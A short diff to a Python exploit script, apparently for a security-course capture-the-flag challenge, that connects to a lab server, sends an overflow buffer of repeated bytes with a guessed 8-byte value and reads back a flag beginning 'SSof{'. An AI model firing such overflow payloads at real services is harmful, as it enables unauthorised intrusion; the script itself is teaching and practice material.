@@ -5,7 +5,8 @@ PORT = 23161
 
 remote = remote(SERVER, PORT, timeout=10000)
 
-buffer = b"a" * 8 + b"a" * 40 + b"a" * 8 + b"\n"
+guess = b"a" * 8
+buffer = guess + b"a" * 40 + guess + b"\n"
 
 remote.sendline(buffer)
 flag = remote.recvline_contains(b"SSof{")
